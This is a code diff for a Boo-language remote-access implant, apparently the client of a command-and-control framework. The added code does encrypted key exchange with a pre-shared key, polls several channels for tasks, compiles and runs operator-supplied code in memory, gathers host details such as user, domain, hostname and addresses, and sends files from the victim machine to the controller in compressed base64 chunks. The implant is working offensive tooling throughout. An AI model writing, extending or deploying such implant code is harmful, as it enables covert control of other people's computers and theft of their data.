@@ -1,7 +1,10 @@
 import System
+import System.Environment
+import System.Globalization
 import System.Reflection
 import System.Text
 import System.IO
+import System.IO.Compression
 import System.Threading
 import System.Diagnostics
 import System.Net
@@ -37,7 +40,31 @@ public def urljoin(*args) as string:
 public def gen_random_string() as string:
     return Guid.NewGuid().ToString("n").Substring(0, 8)
 
+public def Hex2Binary(hex as string) as (byte):
+    chars = hex.ToCharArray()
+    bytes = List[of byte]()
+
+    index = 0
+    while index < chars.Length:
+        chunk = string(chars, index, 2)
+        bytes.Add(byte.Parse(chunk, NumberStyles.AllowHexSpecifier))
+        index += 2
+
+    return bytes.ToArray()
+
+/*
+public static def GetFileChunk(bytes_read as (byte)) as (byte):
+    #using dest_stream = File.Create("$(f_number).chunk"):
+    using dest_stream = MemoryStream():
+        dest_stream.Write(bytes_read, 0, bytes_read.Length)
+        return dest_stream.ToArray()
+*/
+
 class CryptoException(Exception):
+    def constructor(message):
+        super(message)
+
+class CommsException(Exception):
     def constructor(message):
         super(message)
 
@@ -63,30 +90,60 @@ class JsonJob:
 PUT_COMMS_HERE
 
 #
-#
 # End Comms Section
 #
 #
 
+public class FileChunker:
+    public static def CompressFile(file_to_open as string) as string:
+        compressed_file_path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "$(Path.GetFileName(file_to_open)).gzip")
+        using source_file = File.OpenRead(file_to_open):
+            using dest_stream = File.Create(compressed_file_path):
+                using compressed_dest_file = GZipStream(dest_stream, CompressionLevel.Optimal):
+                    source_file.CopyTo(compressed_dest_file)
+
+        return compressed_file_path
+
+    public static def ReadStream(input as Stream) as (byte):
+        buffer as (byte)
+        buffer = array(byte, 81920)
+        if (input.Length - input.Position) < 81920:
+            buffer = array(byte, (input.Length - input.Position))
+
+        input.Read(buffer, 0, buffer.Length)
+        return buffer
+
 class Crypto:
-    public public_key as string
-    private asymAlgo as ECDiffieHellmanCng
-    private server_pubkey as ECDiffieHellmanCngPublicKey
-    private derived_key as (byte)
+    private _PSK as (byte)
+    private derivedKey as (byte)
+    private serverPubKey as ECDiffieHellmanCngPublicKey
+    private asymAlgo as ECDiffieHellmanCng = ECDiffieHellmanCng()
 
-    def constructor():
-        asymAlgo = ECDiffieHellmanCng()
-        public_key = asymAlgo.PublicKey.ToXmlString()
+    public PSK:
+        set:
+            _PSK = Hex2Binary(value)
 
-    public def derive_key(xml as string):
-        server_pubkey = ECDiffieHellmanCngPublicKey.FromXmlString(xml)
-        derived_key = asymAlgo.DeriveKeyMaterial(server_pubkey)
+    public PubKey:
+        get:
+           return asymAlgo.PublicKey.ToXmlString()
 
-    public def HMAC(key as (byte), message as (byte)) as (byte):
+    public EncryptedPubKey:
+        get:
+            return Encrypt(asymAlgo.PublicKey.ToXmlString(), _PSK)
+
+    public def DeriveKey(encryptedServerPubKey as (byte)):
+        serverPubKey = ECDiffieHellmanCngPublicKey.FromXmlString(
+            Encoding.UTF8.GetString(
+                Decrypt(encryptedServerPubKey, _PSK)
+            )
+        )
+        derivedKey = asymAlgo.DeriveKeyMaterial(serverPubKey)
+
+    private def HMAC(key as (byte), message as (byte)) as (byte):
         using hmac = HMACSHA256(key):
             return hmac.ComputeHash(message)
 
-    public def AesEncryptData(cleartext as (byte), key as (byte), iv as (byte)) as (byte):
+    private def AesEncryptData(cleartext as (byte), key as (byte), iv as (byte)) as (byte):
         using aesAlg = Aes.Create():
             aesAlg.Padding = PaddingMode.PKCS7
             aesAlg.KeySize = 256
@@ -101,7 +158,7 @@ class Crypto:
                     cryptoStream.FlushFinalBlock()
                     return encryptedData.ToArray()
 
-    public def AesDecryptData(ciphertext as (byte), key as (byte), iv as (byte)) as (byte):
+    private def AesDecryptData(ciphertext as (byte), key as (byte), iv as (byte)) as (byte):
         using aesAlg = Aes.Create():
             aesAlg.Padding = PaddingMode.PKCS7
             aesAlg.KeySize = 256
@@ -120,34 +177,66 @@ class Crypto:
         iv = array(byte, 16)
         RNGCryptoServiceProvider().GetBytes(iv)
 
-        ciphertext = AesEncryptData(data, derived_key, iv)
-        hmac = HMAC(derived_key, iv + ciphertext)
+        ciphertext = AesEncryptData(data, derivedKey, iv)
+        hmac = HMAC(derivedKey, iv + ciphertext)
 
         return iv + ciphertext + hmac
 
     public def Encrypt(data as string) as (byte):
         return Encrypt(Encoding.UTF8.GetBytes(data))
 
+    public def Encrypt(data as (byte), key as (byte)):
+        iv = array(byte, 16)
+        RNGCryptoServiceProvider().GetBytes(iv)
+
+        ciphertext = AesEncryptData(data, key, iv)
+        hmac = HMAC(key, iv + ciphertext)
+
+        return iv + ciphertext + hmac
+
+    public def Encrypt(data as string, key as (byte)) as (byte):
+        return Encrypt(Encoding.UTF8.GetBytes(data), key)
+
     public def Decrypt(data as (byte)):
         iv, ciphertext, hmac = data[:16], data[16:-32], data[-32:]
 
-        if hmac == HMAC(derived_key, iv + ciphertext):
-            return AesDecryptData(ciphertext, derived_key, iv)
+        if hmac == HMAC(derivedKey, iv + ciphertext):
+            return AesDecryptData(ciphertext, derivedKey, iv)
+
+        raise CryptoException("Invalid HMAC when decrypting data")
+
+    public def Decrypt(data as (byte), key as (byte)):
+        iv, ciphertext, hmac = data[:16], data[16:-32], data[-32:]
+
+        if hmac == HMAC(key, iv + ciphertext):
+            return AesDecryptData(ciphertext, key, iv)
 
         raise CryptoException("Invalid HMAC when decrypting data")
 
 class STJob:
-    public Job as JsonJob
-    public StartTime as DateTime = DateTime.Now
-    public EndTime as DateTime
+    public id as string
+    public cmd as string
+    public result as duck
+    public error as bool = false
+    private StartTime as DateTime = DateTime.Now
+    private EndTime as DateTime
+    private Job as JsonJob
     private Client as STClient
     private sw as Stopwatch = Stopwatch()
+
+    public elapsedjobtime:
+        get:
+            ts = sw.Elapsed
+            return String.Format("{0:00}:{1:00}:{2:00}", ts.Hours, ts.Minutes, ts.Seconds)
 
     def constructor(job as JsonJob, client as STClient):
         Client = client
         Job = job
+
+        id = job.id
+        cmd = Job.cmd
         if Client.Debug:
-            print Job.id, Job.cmd
+            print id, cmd
 
         Start.BeginInvoke(null, null)
 
@@ -164,58 +253,70 @@ class STJob:
     */
 
     public def Start() as string:
-        result = {"id": Job.id, "cmd": Job.cmd}
-        out as duck
         try:
-            if Job.cmd == 'CheckIn':
-                out = CheckIn()
-            elif Job.cmd == 'CompileAndRun':
-                out = CompileAndRun(Job.args.source, Job.args.references)
-            result['status'] = 'success'
-            result['result'] = out
+            if cmd == 'CheckIn':
+                result = CheckIn()
+            elif cmd == 'CompileAndRun':
+                result = CompileAndRun(Job.args.source, Job.args.references)
+            elif cmd == 'Exit':
+                result = Exit()
         except e as Exception:
-            result['status'] = 'error'
-            result['result'] = "$(e)"
+            error = true
+            result = "$(e)"
 
         sw.Stop()
         EndTime = DateTime.Now
-        /*
-        while true:
-            for commChannel in Client.Comms:
-        */
-        payload = JavaScriptSerializer().Serialize(result)
-        if Client.Debug:
-            print payload
-        while true:
-            try:
-                Client.CommChannel.KeyExchange()
-            except e as Exception:
-                if Client.Debug:
-                    print "Error performing key exchange: $(e)"
-                Thread.Sleep(Client.Sleep)
-                continue
 
-            try:
-                Client.CommChannel.SendJobResults(payload, Job.id)
-                return
-            except e as Exception:
-                if Client.Debug:
-                    print "Error sending job (id: $(Job.id)) results: $(e)"
-                Thread.Sleep(Client.Sleep)
-                continue
-
-            Thread.Sleep(Client.Sleep)
+        Client.SendJobResults(self)
 
     public def CheckIn() as Hash:
          return JavaScriptSerializer().Deserialize[of Hash](JavaScriptSerializer().Serialize(Client))
 
-    public def Exit():
-        pass
+    public def Exit() as int:
+        Environment.Exit(0)
+        return 0
+
+    public def Sleep(time as int) as string:
+        Client.Sleep = time
+        return 'Will now check-in every $(Client.Sleep) milliseconds'
+
+    public def Upload(file_path as string) as string:
+        compressed_file =  FileChunker.CompressFile(file_path)
+        using source_file = File.OpenRead(compressed_file):
+            current_chunk_n = 1
+            chunk_n = source_file.Length / 81920
+            bytes_to_send = FileChunker.ReadStream(source_file)
+            while (source_file.Length - source_file.Position) > 0:
+                if Client.Debug:
+                    print "[*] Sending chunk $(current_chunk_n)/$(chunk_n), bytes remaining: $(source_file.Length - source_file.Position)"
+
+                result = {
+                    "chunk_n": chunk_n,
+                    "current_chunk_n": current_chunk_n,
+                    "data": Convert.ToBase64String(bytes_to_send)
+                }
+                Client.SendJobResults(self)
+                Thread.Sleep(Client.Sleep)
+
+                bytes_to_send = FileChunker.ReadStream(source_file)
+                current_chunk_n += 1
+
+            if Client.Debug:
+                print "[*] Sending FINAL chunk $(current_chunk_n), bytes remaining: $(source_file.Length - source_file.Position)"
+
+            result = {
+                "chunk_n": chunk_n,
+                "current_chunk_n": current_chunk_n,
+                "data": Convert.ToBase64String(bytes_to_send)
+            }
+            Client.SendJobResults(self)
+
+        return "Sent File"
 
     public def CompileAndRun(source as string, references as List) as string:
         #print("Received source: \n $source")
         booC = BooCompiler()
-        booC.Parameters.Input.Add( StringInput("Script.boo", source) )
+        booC.Parameters.Input.Add( StringInput("$(id).boo", source) )
         booC.Parameters.Pipeline = CompileToMemory()
         booC.Parameters.Ducky = true
 
@@ -225,19 +326,35 @@ class STJob:
 
         context = booC.Run()
         if context.GeneratedAssembly is null:
+            error = true
             return "Error compiling source:\n$(join(e for e in context.Errors, '\n'))"
         else:
-            var as duck = context.GeneratedAssembly.GetType("ScriptModule")
+            /*
+            for t in context.GeneratedAssembly.GetTypes():
+                print t.Name
+            */
 
-            using scriptOutput = StringWriter():
-                Console.SetOut(scriptOutput)
-                Console.SetError(scriptOutput)
+            if char.IsDigit(id[0]):
+                typeName = "_$(id)Module"
+            else:
+                typeName = "$(char.ToUpper(id[0]) + id.Substring(1))Module"
 
-                #Call the Main function in the compiled assembly
-                var.Main()
+            module as duck = context.GeneratedAssembly.GetType(typeName)
 
-                scriptOutput.Flush()
+            try:
+                using scriptOutput = StringWriter():
+                    Console.SetOut(scriptOutput)
+                    Console.SetError(scriptOutput)
 
+                    #Call the Main function in the compiled assembly if available else call Start
+                    try:
+                        module.Main()
+                    except MissingMethodException:
+                        module.Start(self)
+
+                    scriptOutput.Flush()
+                    return scriptOutput.ToString()
+            ensure:
                 standardOutput = StreamWriter(Console.OpenStandardOutput())
                 standardOutput.AutoFlush = true
                 Console.SetOut(standardOutput)
@@ -246,29 +363,9 @@ class STJob:
                 standardError.AutoFlush = true
                 Console.SetError(standardError)
 
-                return scriptOutput.ToString()
-
-    static public def Compile(source as string, references as List) as Assembly:
-        booC = BooCompiler()
-        booC.Parameters.Input.Add( StringInput("Script.boo", source) )
-        booC.Parameters.Pipeline = CompileToMemory()
-        booC.Parameters.Ducky = true
-
-        #https://github.com/boo-lang/boo/blob/10cfbf08e0f5568220bc621606a3e49d48dc69a5/src/booc/CommandLineParser.cs#L834-L839
-        for r in references:
-            booC.Parameters.References.Add(booC.Parameters.LoadAssembly(r, true))
-
-        context = booC.Run()
-        if context.GeneratedAssembly is null:
-            raise CompilationException("Error compiling source:\n $(join(e for e in context.Errors, '\n'))")
-
-        return context.GeneratedAssembly
-
 class STClient:
     public Jobs as List = []
-    public Guid as Guid
-    #public C2Channels as List = []
-    public CommChannel as Comms
+    public Channels as List = [HTTP()]
     public Sleep = 5000
     public Username = Environment.UserName
     public Domain = Environment.UserDomainName
@@ -277,6 +374,27 @@ class STClient:
     public OsReleaseId = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId", "")
     public Hostname = Environment.MachineName
     public Debug as bool = true
+    private _Guid as Guid
+    private Crypto as Crypto
+
+    public PSK:
+        set:
+            Crypto = Crypto(PSK: value)
+
+    public Guid:
+        set:
+            _Guid = value
+            for ch as duck in Channels:
+                ch.Guid = value
+        get:
+            return _Guid
+
+    public Urls:
+        set:
+            for url in value:
+                for ch as duck in Channels:
+                    if @/:\/\//.Split(url)[0] == ch.GetType().Name.ToLower():
+                        ch.SetCallBackUrl(url)
 
     public OsArch:
         get:
@@ -307,36 +425,63 @@ class STClient:
                 addresses.Extend([uni.Address.ToString() for uni in properties.UnicastAddresses if uni.Address.AddressFamily.ToString() == "InterNetwork" and uni.Address.ToString() != '127.0.0.1'])
             return addresses
 
+    public def DoKex():
+        encryptedPubKey = Crypto.EncryptedPubKey
+
+        while true:
+            for channel as duck in Channels:
+                try:
+                    encryptedServerPubKey = channel.KeyExchange(encryptedPubKey)
+                    Crypto.DeriveKey(encryptedServerPubKey)
+                    return
+                except e as Exception:
+                    if Debug:
+                        print "[Channel: $(channel.Name)] Error performing key exchange: $(e.Message)"
+                    Thread.Sleep(Sleep)
+                    continue
+
+            #Thread.Sleep(Sleep)
+
+    public def Start():
+        DoKex()
+
+        while true:
+            for channel as duck in Channels:
+                try:
+                    encrypted_job = channel.GetJob()
+                    #encrypted_job = channel.GetJob.EndInvoke(job_thread)
+                    if len(encrypted_job) > 0:
+                        decrypted_job = Encoding.UTF8.GetString( Crypto.Decrypt(encrypted_job) )
+                        job = JavaScriptSerializer().Deserialize[of JsonJob](decrypted_job)
+                        Jobs.Add(STJob(job, self))
+                except e as Exception:
+                    if Debug:
+                        print "[Channel: $(channel.Name)] Error retrieving tasking: $(e.Message)"
+                    Thread.Sleep(Sleep)
+                    continue
+            Thread.Sleep(Sleep)
+
+    public def SendJobResults(job as STJob):
+        payload = Crypto.Encrypt(JavaScriptSerializer().Serialize(job))
+
+        while true:
+            for channel as duck in Channels:
+                try:
+                    channel.SendJobResults(payload, job.id)
+                    return
+                except e as Exception:
+                    if Debug:
+                        print "Error sending job (id: $(job.id)) results with $(channel.Name) channel: $(e.Message)"
+                    #Thread.Sleep(Sleep)
+                    continue
+            #Thread.Sleep(Sleep)
+
 public static def Main(argv as (string)):
      #AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler(MyResolveEventHandler)
 
-    clientGuid = Guid(argv[0])
-    client = STClient(Guid: clientGuid, CommChannel: Comms(clientGuid.ToString(), argv[1]))
-    #client.C2Channels.Add(Comms(client.Guid.ToString(), "https://192.168.1.236:8443/"))
-    #client.Jobs.Add(STJob({'id': 'test', 'cmd':'Start', 'args':''}, client))
-
-    while true:
-        #for channel in client.C2Channels
-            #while true:
-        try:
-            client.CommChannel.KeyExchange()
-        except e as Exception:
-            if client.Debug:
-                print "Error performing key exchange: $(e)"
-            Thread.Sleep(client.Sleep)
-            continue
-
-        try:
-            job = client.CommChannel.GetJob()
-            if job:
-                client.Jobs.Add(STJob(job, client))
-        except e as Exception:
-            if client.Debug:
-                print "Error getting jobs: $(e)"
-            Thread.Sleep(client.Sleep)
-            continue
-
-        Thread.Sleep(client.Sleep)
+    client = STClient(Guid: Guid(argv[0]), PSK: argv[1], Urls: @/,/.Split(argv[2]))
+    #client.Jobs.Add(STJob(JsonJob(id: "test", cmd: "Upload"), client))
+    client.Start()
 
     /*
     source = """
